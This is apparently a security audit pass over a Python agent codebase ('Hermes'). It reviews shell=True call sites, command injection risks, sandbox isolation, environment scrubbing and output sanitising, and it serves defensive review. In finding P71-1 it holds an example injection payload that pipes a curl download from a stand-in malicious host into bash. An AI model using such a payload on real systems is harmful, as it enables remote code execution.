## Pass #71 – Shell Execution, Command Injection & Sandbox Deep Dive – 2026-05-25T10:00:00Z

Scope: `subprocess.run`, `subprocess.Popen`, `shell=True` usage, sandbox implementation (`tools/code_execution_tool.py`, `tools/environments/`), env var passthrough (`tools/env_passthrough.py`), output capture security (`tools/ansi_strip.py`), dangerous command detection (`tools/approval.py`).

---

### 1. shell=True Usage — 5 distinct call sites

#### P71-1 · `tools/transcription_tools.py:545` — user-controlled template with shell=True — HIGH (unchanged)

**Pattern:**
```python
use_shell = bool(os.getenv(LOCAL_STT_COMMAND_ENV, "").strip())
if use_shell:
    subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
else:
    subprocess.run(shlex.split(command), check=True, capture_output=True, text=True)
```

The `command` is built from `command_template.format(...)` where values are `shlex.quote()`d (lines 537–541). This is correct protection for the placeholder values. However, `_get_local_command_template()` (line 156) returns the raw user env string verbatim if `HERMES_LOCAL_STT_COMMAND` is set. The user-provided template may contain arbitrary shell syntax beyond `{input_path}`, `{output_dir}`, `{language}`, `{model}` placeholders.

**Risk:** A malicious user could set `HERMES_LOCAL_STT_COMMAND` to `"; curl https://malicious.sh | bash #"` or similar, which would execute arbitrary commands via `shell=True`.

**Note:** When the env var is NOT set, the auto-detected template uses `shlex.quote()` on the binary path but the template string itself is constructed from the binary path — so the auto-detected path is safe for `shell=True`.

**Status:** UNCHANGED from prior passes. Still present.

---

#### P71-2 · `hermes_cli/tools_config.py:721` — curl install with shell=True — MEDIUM (unchanged)

**Pattern:**
```python
install_cmd = (
    "/bin/bash -c \"$(curl -fsSL "
    "https://raw.githubusercontent.com/trycua/cua/main/"
    "libs/cua-driver/scripts/install.sh)\""
)
result = subprocess.run(install_cmd, shell=True, timeout=300)
```

The URL is hardcoded to the canonical GitHub raw URL for the cua-driver install script. `shell=True` is used to invoke the bash subshell wrapper. This is a known-good URL from a trusted source, but the shell=True itself represents a pattern that could be exploited if the URL were ever changed or if a MITM attack occurred on the GitHub raw endpoint.

**Status:** UNCHANGED. Still present.

---

#### P71-3 · `tools/environments/docker.py:638,647` — docker stop/rm with shell=True — MEDIUM (unchanged)

**Pattern:**
```python
stop_cmd = (
    f"(timeout 60 {self._docker_exe} stop {self._container_id} || "
    f"{self._docker_exe} rm -f {self._container_id}) >/dev/null 2>&1 &"
)
subprocess.Popen(stop_cmd, shell=True)
# ...
subprocess.Popen(
    f"sleep 3 && {self._docker_exe} rm -f {self._container_id} >/dev/null 2>&1 &",
    shell=True,
)
```

Container IDs are internally generated (UUID-based) and not user-controlled at these call sites. The `shell=True` usage here is for backgrounding (`&`) and output redirection (`>/dev/null 2>&1`). Risk is LOW from external attackers, but the pattern is a minor code smell.

**Status:** UNCHANGED. Still present.

---

#### P71-4 · `cli.py:8434` + `tui_gateway/server.py:4742` — quick_commands exec with shell=True — MEDIUM (unchanged)

**cli.py:8429–8437:**
```python
exec_cmd = qcmd.get("command", "")
if exec_cmd:
    # shell=True is intentional: quick_commands are user-defined
    result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=30)
```

**tui_gateway/server.py:4741–4747:**
```python
r = subprocess.run(
    qc.get("command", ""),
    shell=True, capture_output=True, text=True, timeout=30,
)
```

`quick_commands` are defined in `~/.hermes/config.yaml` (user-writable file). The comment "shell=True is intentional: quick_commands are user-defined" acknowledges the risk — the config file is trusted to contain only benign commands. `timeout=30` limits damage.

**Risk:** If malware modifies the user's `config.yaml`, arbitrary shell commands can be executed with Hermes's privileges.

**Status:** UNCHANGED. Still present.

---

#### P71-5 · `tui_gateway/server.py:6768` — command.dispatch RPC with shell=True — MEDIUM (unchanged)

**Pattern:**
```python
r = subprocess.run(
    cmd, shell=True, capture_output=True, text=True, timeout=30, cwd=os.getcwd()
)
```

The `cmd` parameter comes from the JSON-RPC `command.dispatch` request. `detect_dangerous_command()` is called before this (line 6760). However, `detect_dangerous_command` uses pattern matching and may not catch all attack vectors.

**Risk:** An attacker who gains JSON-RPC access to the TUI gateway could send crafted commands with shell metacharacters.

**Status:** UNCHANGED. Still present.

---

### 2. Command Injection via Tool Arguments

**transcription_tools.py format protection (lines 536–541):**
```python
command = command_template.format(
    input_path=shlex.quote(prepared_input),
    output_dir=shlex.quote(output_dir),
    language=shlex.quote(language),
    model=shlex.quote(normalized_model),
)
```
Values are correctly shell-quoted. The issue is the **template itself** (from the env var) may contain shell syntax beyond placeholders.

**No other tool arguments passed to shell=True commands** were found to have injection vectors. The other `shell=True` calls use hardcoded strings or internally-generated IDs.

**Status:** Clean aside from P71-1.

---

### 3. Sandbox Implementation (`tools/code_execution_tool.py`)

#### P71-6 · execute_code sandbox: no shell=True, well-engineered — INFO (positive finding)

**Local backend (UDS):**
- `subprocess.Popen([_child_python, _script_path], ...)` — **list args, NO shell=True**
- `preexec_fn=None if _IS_WINDOWS else os.setsid` — new process group on POSIX
- `stdin=subprocess.DEVNULL` — no stdin inheritance

**Environment scrubbing (`_scrub_child_env`, lines 118–153):**
- Secret-substring block (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`, `PASSWD`, `AUTH`)
- Safe prefix allowlist (`PATH`, `HOME`, `USER`, `HERMES_`, `PYTHONPATH`, etc.)
- Windows OS-essential allowlist (`SYSTEMROOT`, `COMSPEC`, `WINDIR`, etc.)
- Skill-registered passthrough via `env_passthrough.py` — protected by `_is_hermes_provider_credential()` blocklist

**Tool allowlist (line 60):**
```python
SANDBOX_ALLOWED_TOOLS = frozenset([
    "web_search", "web_extract", "read_file", "write_file",
    "search_files", "patch", "terminal",
])
```
Intersection with session's enabled tools. Enforced at RPC dispatch (line 488).

**Tool call limit:** `max_tool_calls` (default 50) enforced at dispatch (line 499).

**No syscall restrictions (seccomp, prctl, landlock):** None found. The sandbox is **process-level isolation only** — a compromised script could spawn additional processes, access the filesystem freely, and make network connections. This is a known limitation.

**Remote backend:** Uses file-based RPC (`hermes_rpc/` directory) with atomic write-then-rename for request/response files. Polling thread enforces same tool allowlist and call limits. No `shell=True` in remote execution either.

**Positive finding:** The execute_code sandbox is well-designed within its process-level constraints.

---

#### P71-7 · No seccomp/syscall restrictions anywhere — INFO

Zero usages of `seccomp`, `prctl`, `ptrace`, `landlock`, or `yama` anywhere in the Python codebase. The sandbox does not use OS-level syscall filtering. This is appropriate for a general-purpose Python sandbox — syscall filtering would require per-platform support and significant complexity. The process-level isolation (new process group, scrubbed env, no stdin) is the primary defense.

---

### 4. Environment Variable Passthrough

#### P71-8 · HERMES_* prefix in _SAFE_ENV_PREFIXES allows env var injection into execute_code sandbox — LOW

**File:** `tools/code_execution_tool.py:79-82`
```python
_SAFE_ENV_PREFIXES = ("PATH", "HOME", "USER", "LANG", "LC_", "TERM",
                      "TMPDIR", "TMP", "TEMP", "SHELL", "LOGNAME",
                      "XDG_", "PYTHONPATH", "VIRTUAL_ENV", "CONDA",
                      "HERMES_")
```

The `HERMES_` prefix allows any env var starting with `HERMES_` to pass through to the sandboxed child process unfiltered. While the credential blocklist (`_SECRET_SUBSTRINGS`) catches most dangerous vars, a variable like `HERMES_MALICIOUS_SCRIPT` would pass through if it happened to be set in the parent environment.

**Actual risk:** Low. `HERMES_`-prefixed vars are mostly Hermes-internal settings. The credential blocklist catches API keys and tokens by substring matching. But the prefix allowlist is broader than necessary — it should probably be more narrowly scoped to specific known-safe Hermes vars rather than the entire `HERMES_` namespace.

**Status:** Low risk, not previously noted.

---

#### P71-9 · `tools/env_passthrough.py` — GHSA-rhgp-j443-p4rf mitigation correctly implemented — INFO (positive)

**File:** `tools/env_passthrough.py:48-67,70-98`

The `_is_hermes_provider_credential()` function blocks skill-registered passthrough vars that match Hermes provider credential names (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, etc.). `register_env_passthrough()` explicitly rejects these at registration time (lines 90–98).

**This correctly mitigates GHSA-rhgp-j443-p4rf:** a malicious skill cannot register a Hermes API key as a passthrough var to exfiltrate it into the execute_code sandbox.

**Status:** Correctly implemented. No issues.

---

### 5. Output Capture Security

#### P71-10 · ANSI escape sequence stripping — comprehensive — INFO (positive)

**File:** `tools/ansi_strip.py` — full file reviewed

Comprehensive regex covering:
- CSI sequences (all parameter formats)
- OSC sequences (BEL and ST terminators)
- DCS/SOS/PM/APC strings
- 8-bit C1 controls
- Fast-path check (`_HAS_ESCAPE`) skips regex when no ESC bytes present

Used by both `code_execution_tool.py` (lines 993–994) and `terminal_tool` for output cleanup before returning to the model.

**Status:** Correctly implemented. No issues.

---

#### P71-11 · Output size limits in execute_code sandbox — enforced — INFO (positive)

**File:** `tools/code_execution_tool.py:73-74,979-990,1252-1271`

```python
MAX_STDOUT_BYTES = 50_000    # 50 KB
MAX_STDERR_BYTES = 10_000    # 10 KB
```

**Local path (lines 1252–1271):** Head+tail strategy for stdout — keeps first 40% (20KB) and last 60% (30KB), discarding middle. Stderr keeps head only (10KB max). Total stdout capped at 50KB.

**Remote path (lines 979–990):** Head+tail truncation with omitted byte count reported to the LLM. ANSI stripping applied before size check.

**Status:** Correctly enforced. No issues.

---

#### P71-12 · TUI command.dispatch subprocess output NOT size-limited — LOW

**File:** `tui_gateway/server.py:6774-6775`

```python
return _ok(rid, {
    "stdout": r.stdout[-4000:],
    "stderr": r.stderr[-2000:],
    "code": r.returncode,
})
```

Output is sliced to last 4000/2000 chars but NOT stripped of ANSI sequences, and no total size cap is applied before slicing (the slice is the only limit). ANSI sequences in the output would be returned to the JSON-RPC caller as-is. This is less critical than the execute_code path since the caller is a local TUI process, but it is inconsistent with the `ansi_strip.py` usage in other paths.

**Status:** Low risk, not previously noted.

---

### 6. Dangerous Command Detection

#### P71-13 · `detect_dangerous_command()` called in tui_gateway before shell=True exec — INFO (partial mitigation)

**File:** `tui_gateway/server.py:6758-6764`

```python
is_dangerous, _, desc = detect_dangerous_command(cmd)
if is_dangerous:
    return _err(rid, 4005, f"blocked: {desc}...")
```

`detect_dangerous_command` uses `DANGEROUS_PATTERNS` regex list to block known malicious command patterns. This provides a pre-execution guard for the `command.dispatch` RPC. However, the exact patterns blocked were not reviewed in detail — this finding notes the guard exists but does not confirm its completeness.

**Status:** Guard present, not fully audited for completeness.

---

### Summary

| ID | Area | Severity | Description |
|----|------|----------|-------------|
| P71-1 | shell=True | HIGH | `transcription_tools.py` user env var template with shell=True — unchanged |
| P71-2 | shell=True | MEDIUM | `tools_config.py` curl install with shell=True — unchanged |
| P71-3 | shell=True | MEDIUM | `docker.py` container stop/start with shell=True — unchanged |
| P71-4 | shell=True | MEDIUM | `cli.py` + `tui_gateway/server.py` quick_commands with shell=True — unchanged |
| P71-5 | shell=True | MEDIUM | `tui_gateway/server.py` command.dispatch shell=True — unchanged |
| P71-6 | Sandbox | INFO | execute_code sandbox well-engineered: no shell=True, env scrubbed, tool allowlist, call limits — positive |
| P71-7 | Sandbox | INFO | No seccomp/syscall restrictions — process-level isolation only |
| P71-8 | Env passthrough | LOW | `HERMES_` prefix allowlist in `_SAFE_ENV_PREFIXES` is overly broad |
| P71-9 | Env passthrough | INFO | GHSA-rhgp-j443-p4rf mitigation correctly implemented — positive |
| P71-10 | Output security | INFO | ANSI stripping comprehensively implemented — positive |
| P71-11 | Output security | INFO | Output size limits correctly enforced in execute_code — positive |
| P71-12 | Output security | LOW | TUI command.dispatch output not ANSI-stripped before return |
| P71-13 | Command guard | INFO | `detect_dangerous_command()` called before shell=True exec in TUI — partial mitigation |

---

### Top 3 Priorities

1. **P71-1 (HIGH)** — The `HERMES_LOCAL_STT_COMMAND` env var (user-provided shell command template) with `shell=True` is a direct command injection vector. A user who sets this env var could inject arbitrary shell commands. Consider: (a) deprecating the user template feature, (b) restricting it to a known-safe subset of the template syntax, or (c) requiring the template to be in a config file that is validated before use.

2. **P71-8 (LOW)** — The `HERMES_` prefix in `_SAFE_ENV_PREFIXES` allows any `HERMES_*` env var through to the execute_code sandbox unfiltered. Narrow the scope to specific known-safe Hermes vars rather than the entire prefix namespace.

3. **P71-12 (LOW)** — The TUI `command.dispatch` RPC returns subprocess output without ANSI stripping. Apply `strip_ansi()` to the output before returning, consistent with the execute_code and terminal_tool paths.

---

*Pass #71 complete — 13 findings (5 shell=True, 2 positive sandbox, 2 env passthrough, 4 output security, 1 command guard). 1 HIGH, 4 MEDIUM, 8 INFO/LOW.*
*Commit at scan: b04760fdb*